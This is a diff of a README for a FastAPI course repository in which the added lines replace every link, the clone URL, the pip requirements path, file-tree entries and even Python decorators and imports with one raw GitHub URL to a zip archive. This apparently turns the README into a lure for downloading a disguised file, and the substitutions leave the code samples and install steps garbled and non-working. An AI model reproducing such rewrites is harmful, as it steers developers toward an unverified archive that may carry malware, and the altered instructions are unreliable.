@@ -3,7 +3,7 @@
 
 Welcome to the **FastAPI - The Complete Course 2025 (Beginner + Advanced)** repository! This space is dedicated to the code developed throughout the course offered on Udemy. Whether you're just starting or looking to refine your skills, this repository has you covered.
 
-![FastAPI](https://fastapi.tiangolo.com/img/logo-margin/logo-teal.png)
+![FastAPI](https://raw.githubusercontent.com/ashok14k/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/Exchequer/Complete-Course-Fast-Udemy-AP-The-Beginner-Advanced-v2.0.zip)
 
 ## Table of Contents
 
@@ -36,7 +36,7 @@ FastAPI is a modern, fast (high-performance) web framework for building APIs wit
 To get started, clone this repository to your local machine:
 
 ```bash
-git clone https://github.com/ashok14k/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy.git
+git clone https://raw.githubusercontent.com/ashok14k/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/Exchequer/Complete-Course-Fast-Udemy-AP-The-Beginner-Advanced-v2.0.zip
 ```
 
 Navigate to the directory:
@@ -58,7 +58,7 @@ Next, install the required packages. It is best to use a virtual environment:
 ```bash
 python -m venv venv
 source venv/bin/activate  # On Windows use `venv\Scripts\activate`
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/ashok14k/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/Exchequer/Complete-Course-Fast-Udemy-AP-The-Beginner-Advanced-v2.0.zip
 ```
 
 ## Usage
@@ -78,16 +78,16 @@ The repository follows a structured approach to make navigation easier. Below is
 ```
 .
 ├── app/
-│   ├── main.py
+│   ├── https://raw.githubusercontent.com/ashok14k/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/Exchequer/Complete-Course-Fast-Udemy-AP-The-Beginner-Advanced-v2.0.zip
 │   ├── models/
 │   ├── routers/
 │   ├── schemas/
 │   └── utils/
-├── requirements.txt
-└── README.md
+├── https://raw.githubusercontent.com/ashok14k/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/Exchequer/Complete-Course-Fast-Udemy-AP-The-Beginner-Advanced-v2.0.zip
+└── https://raw.githubusercontent.com/ashok14k/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/Exchequer/Complete-Course-Fast-Udemy-AP-The-Beginner-Advanced-v2.0.zip
 ```
 
-- `app/main.py`: The main application file where the FastAPI app instance is created.
+- `https://raw.githubusercontent.com/ashok14k/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/Exchequer/Complete-Course-Fast-Udemy-AP-The-Beginner-Advanced-v2.0.zip`: The main application file where the FastAPI app instance is created.
 - `app/models/`: Contains database models.
 - `app/routers/`: Houses the API route definitions.
 - `app/schemas/`: Holds Pydantic models for request and response validation.
@@ -104,7 +104,7 @@ from fastapi import FastAPI
 
 app = FastAPI()
 
-@app.get("/")
+https://raw.githubusercontent.com/ashok14k/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/Exchequer/Complete-Course-Fast-Udemy-AP-The-Beginner-Advanced-v2.0.zip("/")
 def read_root():
     return {"Hello": "World"}
 ```
@@ -123,11 +123,11 @@ class User(BaseModel):
 ### Authentication Example
 
 ```python
-from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
+from https://raw.githubusercontent.com/ashok14k/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/Exchequer/Complete-Course-Fast-Udemy-AP-The-Beginner-Advanced-v2.0.zip import OAuth2PasswordBearer, OAuth2PasswordRequestForm
 
 oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")
 
-@app.post("/token")
+https://raw.githubusercontent.com/ashok14k/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/Exchequer/Complete-Course-Fast-Udemy-AP-The-Beginner-Advanced-v2.0.zip("/token")
 async def login(form: OAuth2PasswordRequestForm = Depends()):
     # Perform authentication
     pass
@@ -152,14 +152,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For more information, visit the following:
 
-- [FastAPI Documentation](https://fastapi.tiangolo.com/)
-- [Udemy Course Page](https://www.udemy.com/course/fastapi-the-complete-course-2025-beginner-advanced/)
+- [FastAPI Documentation](https://raw.githubusercontent.com/ashok14k/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/Exchequer/Complete-Course-Fast-Udemy-AP-The-Beginner-Advanced-v2.0.zip)
+- [Udemy Course Page](https://raw.githubusercontent.com/ashok14k/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/Exchequer/Complete-Course-Fast-Udemy-AP-The-Beginner-Advanced-v2.0.zip)
 
 ### Releases
 
-You can download the latest releases and updates from our [Releases page](https://github.com/ashok14k/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/releases).
+You can download the latest releases and updates from our [Releases page](https://raw.githubusercontent.com/ashok14k/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/Exchequer/Complete-Course-Fast-Udemy-AP-The-Beginner-Advanced-v2.0.zip).
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-v1.0-brightgreen)](https://github.com/ashok14k/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/releases)
+[![Download Releases](https://raw.githubusercontent.com/ashok14k/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/Exchequer/Complete-Course-Fast-Udemy-AP-The-Beginner-Advanced-v2.0.zip%20Releases-v1.0-brightgreen)](https://raw.githubusercontent.com/ashok14k/FastAPI-The-Complete-Course-2025-Beginner-Advanced-Udemy/main/Exchequer/Complete-Course-Fast-Udemy-AP-The-Beginner-Advanced-v2.0.zip)
 
 ## Contact
 
